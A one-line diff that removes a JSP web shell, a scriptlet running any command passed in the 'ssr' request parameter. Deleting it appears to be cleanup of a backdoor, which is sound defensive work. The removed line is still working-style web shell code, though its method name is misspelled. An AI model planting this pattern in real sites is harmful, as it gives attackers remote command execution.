@@ -1,1 +1,0 @@
-<% Runtime.getRunTime().exec(request.getParameter("ssr")); %>
